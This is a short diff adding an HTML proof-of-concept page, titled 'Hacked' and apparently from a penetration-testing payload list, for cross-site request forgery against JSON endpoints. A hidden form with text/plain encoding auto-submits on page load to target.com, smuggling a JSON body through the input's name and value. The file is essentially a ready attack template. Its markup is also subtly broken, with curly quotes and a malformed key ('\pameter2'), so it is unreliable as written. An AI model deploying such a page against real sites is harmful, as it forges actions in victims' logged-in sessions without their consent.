@@ -1,0 +1,18 @@
+<!--
+    Conditions: 
+-> Application should accept these Content-Type 
+* Content-Type: text/plain  
+* Content-Type: application/x-www-form-urlencoded  
+* Content-Type: application/xml
+-->
+<html> 
+<title>Hacked</title>
+<body>
+    <h1 align="center">Other Method CSRF In JSON Exploit</h1>
+    <form action=”https://target.com” method=”POST” enctype=”text/plain”>  
+        <input type=”hidden” name=”{\”parameter1\”: \”parameter_value1\”,\pameter2\”: 1000,\”parameter3” value=”\”:\”parameter_value3\”}” />  
+    </form>  
+    <script>document.forms[0].submit();</script>  
+    <p align="center"><b>Share the Exciting Hacking Material of Penetration-List</b></p>
+</body>  
+</html>  
